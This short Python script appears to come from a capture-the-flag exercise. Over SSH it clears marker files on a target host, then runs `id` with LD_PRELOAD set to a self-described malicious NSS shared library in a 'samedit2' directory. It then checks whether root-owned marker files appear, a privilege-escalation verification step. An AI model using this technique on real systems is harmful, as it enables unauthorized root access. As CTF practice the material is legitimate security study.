#!/usr/bin/env python3
"""Verify the malicious NSS module actually loads (as maya, setuid fails but file ops run)."""
import sys
sys.path.insert(0, "/home/boss/Works/ctf/KPMG/VodooSpiritOfDeath2/artifacts")
from ssh_helper import connect, run

c = connect()
run(c, "rm -f /tmp/.r00t /tmp/flag_out")
run(c, "cd /run/lock/samedit2/out && ls -b libnss_X && "
       "LD_PRELOAD='/run/lock/samedit2/out/libnss_X/P0P_SH3LLZ_ .so.2' id 2>&1; echo RC=$?")
run(c, "ls -l /tmp/.r00t /tmp/flag_out 2>&1")
c.close()